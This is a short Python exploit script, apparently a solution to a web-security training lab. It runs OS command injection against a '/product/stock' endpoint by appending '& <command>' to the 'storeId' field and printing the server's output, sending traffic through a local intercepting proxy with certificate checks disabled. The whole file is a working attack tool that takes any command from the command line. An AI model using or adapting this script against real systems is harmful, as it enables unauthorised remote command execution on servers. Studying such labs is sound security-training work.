import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def run_command(url, command):
    stock_path = "/product/stock"
    command_payload = "1 & " + command
    params = {'productId': '1', 'storeId': command_payload}
    res = requests.post(url + stock_path, data=params, verify=False, proxies=proxies)
    if len(res.text) > 3:
        print("[+] Command injection is successful!")
        print("[+] Output of the command: {}".format(res.text))
    else:
        print("[-] Command injection is unsuccessful!")
def main():
    if len(sys.argv) != 3:
        print(f"[+] Usage: python {sys.argv[0]} <url> <command>")
        print(f"[+] Example: python {sys.argv[0]} www.example.com whoami")
        sys.exit(-1)

    url = sys.argv[1].strip()
    command = sys.argv[2].strip()
    print("[+] Exploiting command Injection...")
    run_command(url, command)
    
if __name__ == "__main__":
    main()